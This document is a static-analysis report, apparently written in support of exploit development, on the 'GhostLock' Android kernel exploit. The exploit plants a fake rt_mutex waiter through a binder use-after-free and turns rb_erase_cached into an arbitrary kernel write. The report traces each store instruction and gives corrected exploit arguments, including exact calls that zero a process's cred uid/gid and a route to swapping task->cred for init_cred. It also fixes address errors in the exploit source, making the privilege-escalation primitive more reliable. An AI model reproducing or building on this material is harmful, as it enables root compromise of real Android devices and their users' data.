# GhostLock write primitive — where does the store actually land?

Static analysis only (no device, no edits). Kernel: `[FIRMWARE]\MRX-W09\extracted\vmlinux.elf`
(`Linux version 4.14.116 (android@localhost)`, symbol `linux_banner` @ `0xffffff8009ed1977`).
Exploit: `binder_uaf\session_20260922\ghostlock_mrx\ghostlock_mrx_e.c` (read-only).

Tools: `aarch64-linux-android-objdump -d` / `llvm-nm` from `android-ndk-r20b`.

## 1. Symbols and function

`nm`:
```
ffffff8009e52100 n rb_erase_cached.cfi     <- the function the comment cites
ffffff8009e524ec n rb_erase.cfi            <- plain rb_erase, same body
ffffff8009e52850 n __rb_insert_augmented.cfi
ffffff8009e52ae8 n __rb_erase_color.cfi
ffffff8009e51d64 n rb_next.cfi
ffffff8009e520e0 n rb_first.cfi
```

`__rb_erase_augmented` / `__rb_erase_augmented_cached` have **no separate symbol** — `rb_erase_cached`
inlines `__rb_erase_augmented(..., leftmost, ...)` and then inlines `__rb_erase_color`; the whole thing
lives in `rb_erase_cached.cfi` (`0xffffff8009e52100`–`0xffffff8009e524e4`). `rb_erase.cfi` is the same
body without the `leftmost` handling. Both disassemblies agree on every store below.

### Struct offsets — confirmed independently
```
rb_next.cfi  @0xffffff8009e51d64:
  +0x14  ldr x9,[x0,#8]      ; node->rb_right  == offset 0x08
  +0x20  ldr x9,[x9,#16]     ; descend rb_left == offset 0x10
rb_first.cfi @0xffffff8009e520e0:
  +0x08  ldr x8,[x8,#16]     ; rb_left == offset 0x10
```
So `__rb_parent_color=0`, `rb_right=+8`, `rb_left=+16` — standard. The two-children splice in the
erase itself (`str x9,[x8,#8]` then `str x11,[x10,#16]`) confirms it a third time.

The payload is exact: `build_v2()` and `set_payload()` both put the fake waiter `W` at
`g_sbuf + 0x78`, with `w[0]=value` (`p[0]`), `w[1]=target` (`p[1]`), `w[2]=0` (`p[2]`). The kernel
calls `rb_erase_cached(&waiter->tree_entry, &lock->waiters)` with `tree_entry` first in
`struct rt_mutex_waiter`, i.e. `x0 = W`. So `[x0+8]=p[1]=target` and `[x0+16]=p[2]=0`.

## 2. The erase disassembly (rb_erase_cached.cfi)

```
ffffff8009e52100: ldp  x9, x10, [x0,#8]      ; x9 = [x0+8]  = node->rb_right = p[1] = target
                                             ; x10= [x0+16] = node->rb_left  = p[2] = 0
ffffff8009e52118: cbz  x10, 0x...224c        ; !rb_left  -> PATH A   (p[2]==0 takes this)
ffffff8009e5211c: cbz  x9,  0x...2180        ; !rb_right -> PATH B   (never taken, p[1]!=0 for POINTER; p[2]==0 already diverted LEAF)
ffffff8009e52120: ...                        ; two-children case (not reachable with p[2]=0)

--- PATH A: !rb_left  (0x...224c)  == upstream "if (!tmp)" ---
ffffff8009e5224c: ldr  x10, [x0]             ; x10 = node->__rb_parent_color = p[0] = value
ffffff8009e52250: ands x8, x10, #~3          ; x8  = parent = value & ~3
ffffff8009e52254: b.eq 0x...227c             ; parent==0 -> root->rb_node = child
ffffff8009e52258: ldr  x11, [x8,#16]         ; parent->rb_left
ffffff8009e5225c: cmp  x11, x0
ffffff8009e52260: b.eq 0x...22a4             ; if parent->rb_left==node -> store at parent+16
ffffff8009e52264: str  x9,  [x8,#8]          ; ***STORE #1***  parent->rb_right = child(=p[1])
ffffff8009e52268: cbnz x9, 0x...2284         ; if child(p[1])!=0 ...
ffffff8009e52288: str  x10, [x9]             ; ***STORE #2***  child->__rb_parent_color = p[0]  => *(p[1]) = p[0]
ffffff8009e5227c: str  x9,  [x1]             ; (parent==0)     root->rb_node = child
ffffff8009e522a4: str  x9,  [x8,#16]         ; (left==node)    parent->rb_left = child

--- PATH B: !rb_right  (0x...2180)  == upstream "else if (!child)"  (NOT TAKEN by either shape) ---
ffffff8009e52180: ldr  x8,  [x0]             ; x8 = node->__rb_parent_color = p[0]
ffffff8009e52184: ands x9,  x8, #~3          ; parent
ffffff8009e52188: str  x8,  [x10]            ; ***STORE***  *(node->rb_left = p[2]) = p[0]
ffffff8009e521a0: str  x10, [x9,#8]          ; __rb_change_child
```

The cited address in the source comment (`+0x88 = 0xffffff8009e52188`) is the **PATH B** store
`*(p[2]) = p[0]`. The exploit never enters Path B, because `set_payload/build_v2` set `p[2]=0` and
`cbz x10` diverts to Path A at `+0x18`.

Upstream `linux-4.14.116` `include/linux/rbtree_augmented.h` matches the disassembly instruction for
instruction (`tmp = node->rb_left`, `child = node->rb_right`):
```c
	if (!tmp) {                                  /* PATH A */
		pc = node->__rb_parent_color;
		parent = __rb_parent(pc);            /* pc & ~3 */
		__rb_change_child(node, child, parent, root);   /* *parent->rb_right = child (usually) */
		if (child) { child->__rb_parent_color = pc; rebalance = NULL; }  /* *(child) = pc */
		else       rebalance = __rb_is_black(pc) ? parent : NULL;
		tmp = parent;
	} else if (!child) {                         /* PATH B */
		tmp->__rb_parent_color = pc = node->__rb_parent_color;  /* *(tmp) = pc */
		parent = __rb_parent(pc);
		__rb_change_child(node, tmp, parent, root);
		rebalance = NULL;
		tmp = parent;
	}
```
`__rb_change_child` is `if (parent) { if (parent->rb_left==old) parent->rb_left=new; else
parent->rb_right=new; } else root->rb_node=new;`.

## 3. Payload shape -> exact store

`node = W`, `p[0]=value`, `p[1]=target`, `p[2]=0` for **both** shapes the exploit builds.

| shape | p[0] | p[1] | p[2] | branch entered | exact store instruction(s) | effective address / data |
|---|---|---|---|---|---|---|
| POINTER | value | target != 0 | 0 | **Path A** `!rb_left` (`+0x18`→`+0x14c`) | `str x9,[x8,#8]` (`+0x164`) then `str x10,[x9]` (`+0x288`) | 1st: `*((p0 & ~3)+8) = p1` **then** 2nd: `*(p1) = p0` = **`*(target) = value`** |
| LEAF | value | 0 | 0 | **Path A** `!rb_left` | only `str x9,[x8,#8]` (`+0x164`) (child=0 => no `+0x288`) | `*((p0 & ~3)+8) = 0` |
| (not built) | value | 0 | target != 0 | Path B `!rb_right` (`+0x1c`→`+0x80`) | `str x8,[x10]` (`+0x88`) | `*(p2) = p0` = `*(target) = value` |

Exceptions from `__rb_change_child` (both shapes, when `parent = p0 & ~3 != 0`):
- if `*(parent+16) == node (W)` the store goes to `parent+16` = `(p0 & ~3)+16` instead of `+8`;
- if `parent == 0` (`p0 & ~3 == 0`) it goes to `root->rb_node` (`[x1]`, the fake `rb_root` in the
  window), not to `p0+8`.

### Answers to Q2
- **(a) POINTER shape**: `*(target)=value` **does** happen, but it is the **second** store. The first
  store is the `__rb_change_child` store `*((p0 & ~3)+8) = target`. The source comment's claim that
  `*(target)=value` is the FIRST store is wrong; the `*(value+8)=target` "side effect" it wanted to
  avoid is in fact the first thing that executes (for `value != 0`). `value` is loaded into `x10` from
  `[x0]` at `+0x14c`; it is the `child->__rb_parent_color = pc` source (`+0x288`).
- **(b) LEAF shape**: the **only** store is `*((p0 & ~3)+8) = 0` (i.e. `*(p0+8)=0` for normal aligned
  `p0`), from `__rb_change_child`. It is **not** `*(p0+0x10)=0` (that is only the
  `parent->rb_left==node` corner), not a store of `p0`, and not "no store". Both children being 0
  guarantees Path A with `child = p1 = 0`, so the `+0x288` store is skipped. Since `pc = p0` typically
  has low bit 0, `__rb_is_black(pc)==0` -> `rebalance==NULL`, so `__rb_erase_color` does not run.

## 4. Q3 — definitive store address

For the payloads the exploit actually builds (`p[2]=0`), with `P = p0 & ~3`:

```
address =  (P==0)      ? x1 (fake root)          :   // root->rb_node
           (* (P+16)==W) ? P+16                  :   // parent->rb_left
                            P+8                      // parent->rb_right   <-- normal
data    =  p1                                        // node->rb_right
then, iff p1 != 0:   *(p1) = p0                      // child->__rb_parent_color = pc
```

So `*(target)=value` requires the second store and therefore `p1 = target` (POINTER shape). A pure
zeroing write requires `p1 = 0` (LEAF shape) and lands at `(p0 & ~3)+8`. The value written by the
erase's own fixup is `p0`, never `p1`; the `p1` write lands at `(p0&~3)+8`, never at `p1`.

The `value+8` vs `value+0x10` confusion in the source is exactly the two arms of `__rb_change_child`
(`parent->rb_right` = `+8` vs `parent->rb_left` = `+16`). The `+0x10` arm fires only when
`*(value+0x10) == W`, which does not hold for cred fields, so `+8` is the real one.

## 5. Q4 — zeroing `cred+0x04` (uid)

**Exact argument (LEAF shape): `value = cred + 4 - 8 = cred - 4`, `target = 0`.**

`(cred-4) & ~3 = cred-4` (cred is >=4-byte aligned), store lands at `(cred-4)+8 = cred+4`, data 0.
This is an 8-byte `str`, so it zeroes `uid` **and** `gid` (cred+4..cred+0xB) in one shot.

```
arm_write_inproc(cred + 4 - 8, 0, 0);   /* correct */
arm_write_inproc(cred - 0xC,   0, 0);   /* WRONG: p0&~3 = cred-0xC, store lands at cred-4 */
arm_write_inproc(cred + 4,     0, 0);   /* WRONG: store lands at cred+0xC */
```

This reconciles the source: lines **3589–3592** and **4369** already pass `target-8` (correct), while
the P-cred block **lines 3452–3453** is inconsistent — `arm_write_inproc(P-4,0,0)` writes at `P+4`
(uid, correct) but its comment says `*(P+0xC)`; `arm_write_inproc(P-0xC,0,0)` writes at `P-4`
(comment says `*(P+4)`) and therefore **cannot** zero uid. The note "P-0xC hits P-4 or P+4" is false;
`P-0xC` only reaches `P+4` if `*(P-0xC+0x10)=*(P+4)==W`, which a real cred's uid never is.

### Does LEAF reliably zero? / alternatives
From the erase disassembly, LEAF **is** address-correct for any 4-aligned `addr` (`value=addr-8`),
provided `*(addr+8)` is mapped (it is read at `+0x158` before the store) and `!= W`. If on-device LEAF
still reports `-2 / no store` while passing `addr-8`, the store address is not the cause — see below.

## 6. Why `-2` ("no store observed")

`arm_write_inproc` returns `-2` when `do_write()` returns 0 (`return dw ? 0 : -2`), i.e. the witness
(`getuid()` or the sysctl read) never changed (`do_write` poll loop at lines 2044–2049, returns
`g_stamp_ack==1` at 2095). Two distinct cases:

1. **Address explanation (fits the P-cred calls, lines 3452–3453).** Those pass `P-4` (writes `P+4`,
   correct) alternating with `P-0xC` (writes `P-4`). The `P-0xC` calls land 8 bytes short of the
   intended `P+4`, so uid/suid stay unchanged and the witness stays stale -> `-2`. This is fully
   explained by the `value+0x10` mis-model and needs no other cause.
2. **Carrier explanation (if the four failing calls passed `addr-8`, e.g. lines 3589–3592).** Then the
   effective address is genuinely `addr`; `-2` means the erase never executed (the fake waiter was not
   dequeued / the serialisation stamp did not produce a walk that reached `rb_erase_cached`), **not**
   that the store landed elsewhere. The erase disassembly alone cannot distinguish this; the
   stamper/walk logs (`dw poll vals: start=... cur=... hit=...`, `aki`/`awi` traces) would be needed.
   I cannot confirm case 2 from static analysis.

## Uncertainty / limits
- No DWARF/BTF in the image (`objdump -h` shows no debug sections), so `rb_erase_cached` was matched
  to the source by instruction semantics and by `rb_next`/`rb_first` offset checks, not by debug info.
- The claim "POINTER shape cedes `task->cred = &init_cred`" is consistent with the disassembly
  **only** because the reverse store `*(p1)=p0` is emitted after the `*(p0+8)=p1` side store; the
  side store writes `&task->cred` into `&init_cred+8`, which is benign if that word is writable.
- The exact four calls that produced `-2` are not identified in the report artifact; both readings
  are stated above.
